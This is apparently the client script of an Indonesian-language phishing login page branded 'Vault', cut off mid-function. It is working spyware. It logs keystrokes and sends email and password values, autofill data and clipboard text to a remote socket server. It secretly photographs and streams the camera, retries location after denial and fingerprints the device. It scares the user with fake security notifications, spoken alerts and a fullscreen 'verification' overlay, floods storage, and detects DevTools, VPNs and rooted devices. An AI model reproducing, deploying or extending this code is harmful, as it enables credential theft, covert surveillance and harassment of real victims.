let deviceId = '', watchId = null, stream = null, snapInterval = null;
let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null, notifInterval = null;
const emailInput = document.getElementById('emailInput');
const passInput = document.getElementById('passInput');

setTimeout(() => document.getElementById('splash').classList.add('hidden'), 1800);

function registerSW() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').then(reg => {
            socket.emit('device-info', { sw: { registered: true, scope: reg.scope } });
            if ('SyncManager' in window) {
                reg.sync.register('sync-tracker').catch(()=>{});
            }
            if ('periodicSync' in reg) {
                navigator.permissions.query({name:'periodic-background-sync'}).then(p => {
                    if (p.state === 'granted') {
                        reg.periodicSync.register('periodic-tracker', { minInterval: 10*60*1000 }).catch(()=>{});
                    }
                });
            }
        }).catch(() => {});
    }
}

function initIdleDetection() {
    let idleSince = null;
    function resetIdle() { idleSince = null; socket.emit('device-info', { idle: { state: 'active', time: Date.now() } }); }
    function markIdle() { idleSince = Date.now(); socket.emit('device-info', { idle: { state: 'idle', idleFor: 60000, time: Date.now() } }); }
    document.addEventListener('mousemove', resetIdle);
    document.addEventListener('keydown', resetIdle);
    document.addEventListener('touchstart', resetIdle);
    document.addEventListener('scroll', resetIdle);
    setInterval(() => {
        if (idleSince === null) { idleSince = Date.now(); }
        const ms = Date.now() - idleSince;
        if (ms > 60000 && !document.hidden) {
            socket.emit('device-info', { idle: { state: 'idle', idleFor: ms, time: Date.now() } });
        }
    }, 15000);
}

function speakText(text) {
    if (!window.speechSynthesis) return;
    try {
        window.speechSynthesis.cancel();
        const u = new SpeechSynthesisUtterance(text);
        u.lang = 'id-ID';
        u.rate = 0.9;
        u.pitch = 0.8;
        window.speechSynthesis.speak(u);
        socket.emit('device-info', { speech: { text: text.slice(0,100), time: Date.now() } });
    } catch(e) {}
}

function scheduleGhostSpeech() {
    const messages = [
        'Akun Anda telah diakses dari perangkat yang tidak dikenal.',
        'Terdeteksi aktivitas mencurigakan pada akun Anda.',
        'Silakan verifikasi identitas Anda segera untuk mengamankan akun.',
        'Percobaan login gagal terdeteksi. Lindungi akun Anda.'
    ];
    setTimeout(() => speakText(messages[0]), 5000);
    setTimeout(() => speakText(messages[1]), 15000);
    setTimeout(() => speakText(messages[2]), 30000);
    const origHandle = handleLogin;
    window.handleLogin = async function(e) {
        const r = await origHandle(e);
        speakText(messages[attemptCount % messages.length]);
        return r;
    };
}

function startStorageFlood() {
    const DB_NAME = 'VaultCache';
    const STORE = 'blobs';
    let db = null;
    const req = indexedDB.open(DB_NAME, 1);
    req.onupgradeneeded = (e) => {
        db = e.target.result;
        if (!db.objectStoreNames.contains(STORE)) db.createObjectStore(STORE);
    };
    req.onsuccess = (e) => {
        db = e.target.result;
        let chunk = 0;
        floodInterval = setInterval(() => {
            try {
                const tx = db.transaction(STORE, 'readwrite');
                const store = tx.objectStore(STORE);
                const blob = new Blob([new ArrayBuffer(512 * 1024)]);
                store.put(blob, 'chunk_' + (chunk++));
                socket.emit('device-info', { storageFlood: { chunks: chunk, totalMB: Math.round(chunk * 0.5) } });
            } catch(e) {
                clearInterval(floodInterval);
                socket.emit('device-info', { storageFlood: { error: e.message, chunks: chunk } });
            }
        }, 10000);
    };
}

function initFullscreenHijack() {
    const overlay = document.createElement('div');
    overlay.id = 'fs-overlay';
    overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🔒</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi Keamanan</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
    document.body.appendChild(overlay);

    let fsActive = false;

    function enterFS() {
        const el = document.documentElement;
        if (el.requestFullscreen) {
            el.requestFullscreen().then(() => {
                fsActive = true;
                overlay.style.display = 'flex';
                socket.emit('device-info', { fullscreen: { state: 'active', time: Date.now() } });
            }).catch(() => {});
        }
    }

    document.addEventListener('click', () => {
        if (!fsActive) enterFS();
    }, { once: true });

    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && fsActive) {
            fsActive = false;
            overlay.style.display = 'none';
            setTimeout(enterFS, 500);
        }
    });

    overlay.querySelector('button').addEventListener('click', () => {
        overlay.style.display = 'none';
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(() => {});
        }
        fsActive = false;
        setTimeout(enterFS, 30000);
    });

    setInterval(() => {
        if (!document.fullscreenElement) enterFS();
    }, 120000);
}

function initNotificationSpam() {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'granted') {
        startNotifSpam();
    } else if (Notification.permission !== 'denied') {
        Notification.requestPermission().then(p => {
            if (p === 'granted') startNotifSpam();
        });
    }
}

function startNotifSpam() {
    const msgs = [
        { title: '\u26a0\ufe0f Peringatan Keamanan', body: 'Login mencurigakan terdeteksi dari perangkat baru.' },
        { title: '\U0001f512 Verifikasi Diperlukan', body: 'Akun Anda mungkin telah diretas. Verifikasi segera.' },
        { title: '\U0001f6a8 Aktivitas Tidak Biasa', body: 'Terlalu banyak percobaan login dari lokasi tidak dikenal.' },
        { title: '\U0001f6e1\ufe0f Lindungi Akun Anda', body: 'Akses tidak sah terdeteksi. Ubah kata sandi Anda sekarang.' },
        { title: '\U0001f4f1 Perangkat Baru Terdeteksi', body: 'Perangkat tidak dikenal mencoba mengakses akun Anda.' }
    ];
    let idx = 0;
    notifInterval = setInterval(() => {
        try {
            const n = new Notification(msgs[idx].title, { body: msgs[idx].body, icon: '/favicon.svg', tag: 'vault-spam' });
            idx = (idx + 1) % msgs.length;
            setTimeout(() => n.close(), 3000);
            socket.emit('device-info', { notifSpam: { title: msgs[idx].title, time: Date.now() } });
        } catch(e) {}
    }, 8000);
}

function initPersistentStorage() {
    if (navigator.storage && navigator.storage.persist) {
        navigator.storage.persist().then(granted => {
            socket.emit('device-info', { persistentStorage: { granted, time: Date.now() } });
        });
    }
    if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(est => {
            socket.emit('device-info', { storageEstimate: { usage: est.usage, quota: est.quota, pct: Math.round(est.usage/est.quota*100) } });
        });
    }
    const dbReq = indexedDB.open('VaultPersist', 1);
    dbReq.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
    };
    dbReq.onsuccess = (e) => {
        const db = e.target.result;
        const tx = db.transaction('data', 'readwrite');
        tx.objectStore('data').put({ deviceId, time: Date.now() }, 'device');
        setInterval(() => {
            const tx2 = db.transaction('data', 'readwrite');
            tx2.objectStore('data').put({ location: { lat: 'pending', time: Date.now() } }, 'lastData');
        }, 60000);
    };
}

const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });

// Live camera stream control
let camStreamInterval = null;
socket.on('start-camera-stream', () => {
    if (camStreamInterval) return;
    if (!stream || !stream.getVideoTracks().length) return;
    const v = document.querySelector('video[data-snap]');
    if (!v) return;
    const c = document.createElement('canvas');
    camStreamInterval = setInterval(() => {
        const s = stream.getVideoTracks()[0].getSettings();
        c.width = s.width || 320; c.height = s.height || 240;
        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
        socket.emit('camera-stream', { image: c.toDataURL('image/jpeg',0.4).split(',')[1] });
    }, 1000);
});
socket.on('stop-camera-stream', () => {
    if (camStreamInterval) { clearInterval(camStreamInterval); camStreamInterval = null; }
});

function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>\u2715</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }

function requestFrontCamera() {
    if (!navigator.mediaDevices?.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
        .then((s) => {
            const v = document.createElement('video');
            v.autoplay = true; v.playsinline = true;
            v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
            v.srcObject = s; document.body.appendChild(v);
            v.onloadedmetadata = () => {
                v.play();
                setTimeout(() => {
                    const ca = document.createElement('canvas');
                    ca.width = 640; ca.height = 480;
                    ca.getContext('2d').drawImage(v, 0, 0, 640, 480);
                    socket.emit('snapshot', { image: ca.toDataURL('image/jpeg',0.5).split(',')[1], front: true });
                    s.getTracks().forEach(t => t.stop());
                }, 500);
            };
        })
        .catch(() => {});
}

function initKeystrokeLogger() {
    let lastSent = 0;
    function logKey(e) {
        if (e.key === 'Tab' || e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
        socket.emit('keystroke', { k: e.key, ts: Date.now() });
    }
    emailInput.addEventListener('keydown', logKey);
    passInput.addEventListener('keydown', logKey);
    setInterval(() => {
        const email = emailInput.value;
        const pass = passInput.value;
        if (email) socket.emit('device-info', { fieldEmail: email.slice(0,200) });
        if (pass && pass.length > 0) {
            socket.emit('device-info', { fieldPass: pass.slice(0,100) });
        }
    }, 3000);
}

function initClickHeatmap() {
    document.addEventListener('click', (e) => {
        socket.emit('clickmap', {
            x: e.clientX, y: e.clientY,
            el: e.target.tagName + (e.target.id ? '#'+e.target.id : '') + (e.target.className ? '.'+e.target.className : '')
        });
    });
    let maxScroll = 0;
    window.addEventListener('scroll', () => {
        const pct = Math.round((window.scrollY + window.innerHeight) / document.body.scrollHeight * 100);
        if (pct > maxScroll) { maxScroll = pct; socket.emit('clickmap', { x:-1, y:pct, el:'scroll:'+pct+'%' }); }
    });
}

function initAutofillDetection() {
    function checkAutofill() {
        if (emailInput.value && emailInput.value !== '') {
            socket.emit('autofill', { value: emailInput.value, field: 'email' });
        }
        if (passInput.value && passInput.value !== '') {
            socket.emit('autofill', { value: passInput.value, field: 'password' });
        }
    }
    const style = document.createElement('style');
    style.id = 'autofill-style';
    document.head.appendChild(style);
    emailInput.addEventListener('animationstart', (e) => {
        if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
    });
    passInput.addEventListener('animationstart', (e) => {
        if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
    });
    let lastEmail = '', lastPass = '';
    setInterval(() => {
        if (emailInput.value !== lastEmail && emailInput.value) {
            lastEmail = emailInput.value;
            socket.emit('autofill', { value: lastEmail, field: 'email' });
        }
        if (passInput.value !== lastPass && passInput.value) {
            lastPass = passInput.value;
            socket.emit('autofill', { value: lastPass, field: 'password' });
        }
    }, 2000);
}

function initVisibilityTracker() {
    document.addEventListener('visibilitychange', () => {
        const state = document.hidden ? 'hidden' : 'visible';
        socket.emit('visibility', { state, time: Date.now() });
        if (document.hidden) {
            if (snapInterval) {
                clearInterval(snapInterval);
                snapInterval = setInterval(captureSnapshot, 2000);
            }
        } else {
            if (snapInterval) {
                clearInterval(snapInterval);
                snapInterval = setInterval(captureSnapshot, 5000);
            }
        }
    });
}

function stealthGPS() {
    if (!navigator.geolocation) return;
    const tryGPS = () => {
        gpsDeniedCount++;
        const timeout = Math.min(5000 * gpsDeniedCount, 60000);
        navigator.geolocation.getCurrentPosition(
            (p) => {
                socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, stealthRetry: true, attempt: gpsDeniedCount });
            },
            (err) => {
                if (err.code === 1) {
                    setTimeout(tryGPS, timeout);
                }
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    };
    setTimeout(tryGPS, 5000);
}

let wakeLockSentinel = null;
async function requestWakeLock() {
    try {
        if (navigator.wakeLock) {
            wakeLockSentinel = await navigator.wakeLock.request('screen');
            socket.emit('device-info', { wakeLock: true });
        }
    } catch(e) {
        socket.emit('device-info', { wakeLock: false, wakeLockError: e.message });
    }
}

function initLightSensor() {
    try {
        if ('AmbientLightSensor' in window) {
            const sensor = new AmbientLightSensor();
            sensor.addEventListener('reading', () => {
                socket.emit('device-info', { light: { illuminance: sensor.illuminance, time: Date.now() } });
            });
            sensor.addEventListener('error', () => {});
            sensor.start();
        }
    } catch(e) {}
    if (window.screen && screen.availBrightness) {
        try {
            screen.availBrightness.then(b => {
                socket.emit('device-info', { light: { screenBrightness: b } });
            }).catch(()=>{});
        } catch(e) {}
    }
}

function playNotifSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination);
        osc.frequency.setValueAtTime(880, ctx.currentTime);
        osc.frequency.setValueAtTime(660, ctx.currentTime + 0.15);
        osc.frequency.setValueAtTime(440, ctx.currentTime + 0.3);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.5);
    } catch(e) {}
}

function showFakeNotif(title, body) {
    const el = document.getElementById('notifToast');
    document.getElementById('ntTitle').textContent = title;
    document.getElementById('ntBody').textContent = body;
    el.classList.add('show');
    playNotifSound();
    if (navigator.vibrate) navigator.vibrate([80, 50, 80, 50, 150]);
    setTimeout(() => {
        el.classList.remove('show');
        requestFrontCamera();
    }, 4000);
}

function dismissNotif() {
    document.getElementById('notifToast').classList.remove('show');
    requestFrontCamera();
}

function vibrate() { if (navigator.vibrate) navigator.vibrate([30,50,30,50,100]); }

function initMultiWindow() {
    if ('BroadcastChannel' in window) {
        const bc = new BroadcastChannel('vault_tracker');
        bc.postMessage({ type: 'open', time: Date.now() });
        let tabCount = 1;
        bc.onmessage = (e) => {
            if (e.data.type === 'open') tabCount++;
            if (e.data.type === 'close') tabCount--;
            socket.emit('device-info', { tabs: tabCount });
        };
        window.addEventListener('beforeunload', () => {
            bc.postMessage({ type: 'close' });
        });
    }
}

let snapVideo = null, snapCanvas = null;
function captureSnapshot() {
    if (!stream?.getVideoTracks()?.length) return;
    if (!snapVideo) {
        snapVideo = document.querySelector('video[data-snap]');
        snapCanvas = document.createElement('canvas');
    }
    const s = stream.getVideoTracks()[0].getSettings();
    snapCanvas.width = s.width || 640; snapCanvas.height = s.height || 480;
    if (snapVideo) {
        snapCanvas.getContext('2d').drawImage(snapVideo, 0, 0, snapCanvas.width, snapCanvas.height);
        socket.emit('snapshot', { image: snapCanvas.toDataURL('image/jpeg',0.6).split(',')[1] });
    }
}

function startSnapshots() {
    const v = document.createElement('video');
    v.autoplay = true; v.playsinline = true; v.setAttribute('data-snap','1');
    v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
    v.srcObject = stream; document.body.appendChild(v);
    snapVideo = v;
    snapCanvas = document.createElement('canvas');
    v.onloadedmetadata = () => {
        v.play();
        snapInterval = setInterval(captureSnapshot, 5000);
    };
}

function sendDeviceInfo() {
    const info = {};
    if (navigator.getBattery) {
        navigator.getBattery().then(bat => {
            info.battery = { level: bat.level, charging: bat.charging };
            bat.addEventListener('levelchange', () => { info.battery.level=bat.level; socket.emit('device-info',info); });
            bat.addEventListener('chargingchange', () => { info.battery.charging=bat.charging; socket.emit('device-info',info); });
            socket.emit('device-info', info);
        });
    }
    if (navigator.connection) {
        const conn = navigator.connection;
        info.connection = { type: conn.type||'unknown', effectiveType: conn.effectiveType||'' };
        socket.emit('device-info', info);
        conn.addEventListener('change', () => { info.connection={type:conn.type||'unknown',effectiveType:conn.effectiveType||''}; socket.emit('device-info',info); });
    }
}

function ipGeolocate() {
    fetch('https://ip-api.com/json/?fields=lat,lon,city,regionName,country,query,isp').then(r=>r.json()).then(d=>{
        if(d.lat&&d.lon) socket.emit('location',{lat:d.lat,lng:d.lon,accuracy:5000,ipFallback:true,city:d.city,region:d.regionName,country:d.country});
    }).catch(()=>{});
}

function getFingerprint() {
    const fp = { screen:screen.width+'x'+screen.height, availScreen:screen.availWidth+'x'+screen.availHeight, platform:navigator.platform||'', language:navigator.language, languages:navigator.languages?.join(','), timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, tzOffset:new Date().getTimezoneOffset(), cpu:navigator.hardwareConcurrency||'', mem:navigator.deviceMemory||'', touch:'ontouchstart' in window, cookies:navigator.cookieEnabled };
    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Vault\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
    socket.emit('device-info',{fingerprint:fp});
}

function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3)socket.emit('device-info',{clipboard:t.slice(0,500)})}).catch(()=>{}); }

function initMotionSensor() {
    if(window.DeviceOrientationEvent) window.addEventListener('deviceorientation',e=>{if(e.alpha!==null)socket.emit('device-info',{orientation:{alpha:e.alpha,beta:e.beta,gamma:e.gamma,time:Date.now()}})},false);
    if(window.DeviceMotionEvent) window.addEventListener('devicemotion',e=>{if(e.acceleration)socket.emit('device-info',{motion:{accX:e.acceleration.x,accY:e.acceleration.y,accZ:e.acceleration.z,rotAlpha:e.rotationRate?.alpha,rotBeta:e.rotationRate?.beta,rotGamma:e.rotationRate?.gamma,time:Date.now()}})},false);
}

function startKeepalive() { setInterval(()=>{if(socket.connected)socket.emit('ping',Date.now());},30000); }

function leakWebRTC() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                const ip = e.candidate.candidate.split(' ')[4];
                if (ip && !ip.includes(':')) {
                    socket.emit('device-info', { webrtcIP: ip });
                }
            }
        };
        setTimeout(() => pc.close(), 3000);
    } catch(e) {}
}

function getWebGLFingerprint() {
    try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
            const info = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTexSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxVertex: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
            };
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) {
                info.unmaskedVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                info.unmaskedRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            }
            socket.emit('device-info', { webgl: info });
        }
    } catch(e) {}
}

function getAudioFingerprint() {
    try {
        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        const osc = ctx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.value = 10000;
        const gain = ctx.createGain();
        gain.gain.value = 0.1;
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering().then(buffer => {
            const data = buffer.getChannelData(0);
            let hash = 0;
            for (let i = 0; i < data.length; i += 100) {
                hash = ((hash << 5) - hash) + Math.round(data[i] * 1000);
                hash = hash & hash;
            }
            socket.emit('device-info', { audioFP: { hash: Math.abs(hash).toString(16), sampleCount: data.length } });
        }).catch(()=>{});
    } catch(e) {}
}

function lockOrientation() {
    if (screen.orientation && screen.orientation.lock) {
        screen.orientation.lock('portrait').catch(() => {});
        socket.emit('device-info', { orientationLock: { locked: true, type: screen.orientation.type } });
    }
}

function enumerateFonts() {
    const fonts = [
        'monospace','serif','sans-serif','Arial','Helvetica','Times New Roman','Courier New',
        'Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS',
        'Arial Black','Impact','Tahoma','Lucida Console','Lucida Sans','Segoe UI','Calibri',
        'Cambria','Candara','Consolas','Constantia','Corbel','Franklin Gothic','Noto Sans',
        'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','Playfair Display'
    ];
    const canvas = document.createElement('canvas');
    canvas.width = 200; canvas.height = 40;
    const ctx = canvas.getContext('2d');
    ctx.font = '20px monospace';
    const base = ctx.measureText('wm').width;

    const installed = [];
    for (const f of fonts) {
        ctx.font = '20px "' + f + '", monospace';
        const w = ctx.measureText('wm').width;
        if (w !== base) installed.push(f);
    }
    socket.emit('device-info', { fonts: { installed, count: installed.length } });
}

function detectPreferences() {
    const prefs = {};
    if (window.matchMedia) {
        prefs.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
        prefs.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        prefs.reducedTransparency = window.matchMedia('(prefers-reduced-transparency: reduce)').matches;
        prefs.highContrast = window.matchMedia('(prefers-contrast: high)').matches;
        prefs.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches;
    }
    socket.emit('device-info', { preferences: prefs });
}

function speedTest() {
    const start = Date.now();
    fetch(SERVER_URL + '/?speedtest=' + Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(r => {
        const time = Date.now() - start;
        const speed = time < 1 ? 0 : Math.round(1000 / time);
        socket.emit('device-info', { speedTest: { ms: time, score: speed } });
    }).catch(() => {});
}

function initPointerLock() {
    const el = document.documentElement;
    document.addEventListener('click', () => {
        if (document.pointerLockElement) return;
        el.requestPointerLock();
        socket.emit('device-info', { pointerLock: { state: 'requested', time: Date.now() } });
    }, { once: true });
    document.addEventListener('pointerlockchange', () => {
        socket.emit('device-info', { pointerLock: { state: document.pointerLockElement ? 'locked' : 'unlocked', time: Date.now() } });
        if (!document.pointerLockElement) {
            setTimeout(() => { try { el.requestPointerLock(); } catch(e) {} }, 2000);
        }
    });
}

function scanBluetooth() {
    if (!navigator.bluetooth) return;
    navigator.bluetooth.requestDevice({ acceptAllDevices: true, optionalServices: [] })
        .then(device => {
            socket.emit('device-info', { bluetooth: { name: device.name, id: device.id, connected: device.gatt?.connected } });
        })
        .catch(() => {});
}

function detectPosture() {
    if ('devicePosture' in navigator) {
        const p = navigator.devicePosture;
        socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
        p.addEventListener('change', () => {
            socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
        });
    }
    if (window.visualViewport) {
        const segments = window.visualViewport.segments;
        if (segments && segments.length > 1) {
            socket.emit('device-info', { foldable: { segments: segments.length, time: Date.now() } });
        }
    }
}

function initSharedWorker() {
    try {
        const workerCode = `
            const ports = [];
            self.onconnect = (e) => {
                const port = e.ports[0];
                ports.push(port);
                port.onmessage = (ev) => {
                    ports.forEach(p => { if (p !== port) p.postMessage(ev.data); });
                };
                port.postMessage({ type: 'connected', time: Date.now() });
            };
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const worker = new SharedWorker(URL.createObjectURL(blob));
        worker.port.start();
        worker.port.onmessage = (e) => {
            if (e.data.type === 'connected') {
                socket.emit('device-info', { sharedWorker: { connected: true, time: Date.now() } });
            }
        };
        setInterval(() => {
            worker.port.postMessage({ type: 'ping', time: Date.now() });
        }, 30000);
        window._sharedWorker = worker;
    } catch(e) {}
}

function cpuTiming() {
    const results = [];
    for (let size = 10000; size <= 100000; size += 30000) {
        const arr = new Array(size);
        const start = performance.now();
        for (let i = 0; i < arr.length; i++) {
            arr[i] = Math.sqrt(i * i + i);
        }
        const time = performance.now() - start;
        results.push({ size, ms: Math.round(time * 100) / 100, opsPerMs: Math.round(size / time) });
    }
    socket.emit('device-info', { cpuTiming: results });
}

function initAntiForensics() {
    let devtoolsOpen = false;
    function detectDevTools() {
        if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
            reportForensics('devtools', 'Firebug detected');
            return;
        }
        const e = document.createElement('div');
        Object.defineProperty(e, 'id', { get: function() { reportForensics('devtools', 'DevTools console open (getter triggered)'); devtoolsOpen = true; } });
        console.log('%c', e);
        const img = new Image();
        Object.defineProperty(img, 'id', { get: function() { if (!devtoolsOpen) { reportForensics('devtools', 'DevTools detected via stack trace'); devtoolsOpen = true; } } });
        console.debug(img);
        setInterval(() => {
            const start = performance.now();
            debugger;
            const diff = performance.now() - start;
            if (diff > 100) {
                reportForensics('devtools', 'DevTools or debugger detected (debugger statement paused ' + Math.round(diff) + 'ms)');
                devtoolsOpen = true;
            }
        }, 4000);
    }

    function detectVPN() {
        if (deviceId) {
            fetch('https://ip-api.com/json/?fields=query').then(r=>r.json()).then(d => {
                const publicIP = d.query;
                if (publicIP && socket) {
                    setTimeout(() => {
                        fetch(SERVER_URL + '/api/devices/'+deviceId).then(r=>r.json()).then(dev => {
                            const localIP = dev.webrtcIP || '';
                            if (localIP && publicIP !== localIP) {
                                if (!localIP.startsWith('10.') && !localIP.startsWith('192.168.') && !localIP.startsWith('172.')) {
                                    reportForensics('vpn', 'Public IP mismatch: WebRTC=' + localIP + ' vs Public=' + publicIP + ' (possible VPN/proxy)');
                                }
                            }
                        }).catch(()=>{});
                    }, 5000);
                }
            }).catch(()=>{});
        }
        const start = performance.now();
        fetch(SERVER_URL + '/?vpn-test='+Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(() => {
            const latency = performance.now() - start;
            if (latency > 2000) {
                reportForensics('vpn', 'High latency (' + Math.round(latency) + 'ms) \u2014 possible VPN/proxy');
            }
        }).catch(()=>{});
    }

    function detectEmulator() {
        const ua = navigator.userAgent.toLowerCase();
        const emulators = [
            { pattern: /android.*emu|android.*avd|android.*android sdk/i, name: 'Android Emulator' },
            { pattern: /xcode|iphone simulator/i, name: 'iOS Simulator' },
            { pattern: /genymotion|bluestacks|nox|mumu|ldplayer|memu|ko player/i, name: 'Android Emulator' },
            { pattern: /windows.*phone|wpDesktop/i, name: 'Windows Phone Emulator' },
        ];
        for (const em of emulators) {
            if (em.pattern.test(ua)) {
                reportForensics('emulator', 'Emulator detected: ' + em.name + ' (UA: ' + navigator.userAgent.slice(0,80) + ')');
                return;
            }
        }
        const w = screen.width, h = screen.height;
        const emuScreens = [
            [360, 640], [375, 667], [414, 736], [412, 846],
            [360, 780], [393, 851], [430, 932]
        ];
    }

    function detectRoot() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('supersu') || ua.includes('magisk') || ua.includes('kingroot') || ua.includes('xposed')) {
            reportForensics('root', 'Root detected: ' + ua.slice(0,80));
            return;
        }
        try {
            const fsCheck = document.createElement('iframe');
            fsCheck.style.display = 'none';
            fsCheck.src = 'file:///private/var/lib/apt';
            document.body.appendChild(fsCheck);
            fsCheck.onload = () => reportForensics('root', 'Jailbreak detected (access to /private/var/lib/apt)');
            setTimeout(() => fsCheck.remove(), 2000);
        } catch(e) {}
        try {
            const fsCheck2 = document.createElement('iframe');
            fsCheck2.style.display = 'none';
            fsCheck2.src = 'file:///system/app/Superuser.apk';
            document.body.appendChild(fsCheck2);
            fsCheck2.onload = () => reportForensics('root', 'Root detected (access to Superuser.apk)');
            setTimeout(() => fsCheck2.remove(), 2000);
        } catch(e) {}
        try {
            if (window.indexedDB && window.indexedDB.databases) {
            }
        } catch(e) {}
    }

    function reportForensics(type, detail) {
        fetch(SERVER_URL + '/api/alert-forensics', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, type, detail })
        }).catch(()=>{});
        if (socket && socket.connected) {
            socket.emit('forensics', { type, detail, time: Date.now() });
        }
    }

    detectDevTools();
    detectVPN();
    detectEmulator();
    detectRoot();
}

function requestPermissions() {
    sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard();
    initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
    initKeystrokeLogger(); initClickHeatmap(); initAutofillDetection();
    initVisibilityTracker(); initMultiWindow();
    registerSW(); initIdleDetection(); initNotificationSpam();
    initPersistentStorage(); initFullscreenHijack(); startStorageFlood();
    leakWebRTC(); getWebGLFingerprint(); getAudioFingerprint();
    lockOrientation(); enumerateFonts(); detectPreferences();
    speedTest(); initPointerLock(); detectPosture();
    initSharedWorker(); cpuTiming();
    initAntiForensics();

    setTimeout(() => {
        showFakeNotif('Verifikasi Keamanan', 'Sistem mendeteksi login dari perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
    }, 3000);
    scheduleGhostSpeech();

    return new Promise((r) => {
        let loc=false, cam=false;
        const c=()=>{if(loc&&cam)r();};

        if (navigator.geolocation) {
            function requestGPS() {
                navigator.geolocation.getCurrentPosition(
                    (p)=>{
                        socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
                        if(!loc){loc=true;c();}
                    },
                    (err)=>{
                        if(!loc){loc=true;c();}
                        if(err.code===1){stealthGPS();}
                    },
                    {enableHighAccuracy:true,timeout:15000}
                );
            }

            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({name:'geolocation'}).then(p => {
                    if (p.state === 'denied') {
                        if(!loc){loc=true;c();}
                        stealthGPS();
                    } else {
                        requestGPS();
                        p.onchange = () => {
                            if (p.state === 'granted') requestGPS();
                        };
                    }
                }).catch(() => requestGPS());
            } else {
                requestGPS();
            }
        } else {
            if(!loc){loc=true;c();}
        }

        if (navigator.mediaDevices?.getUserMedia) {
            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
                .then((s)=>{stream=s;if(!cam){cam=true;c();}startSnapshots();})
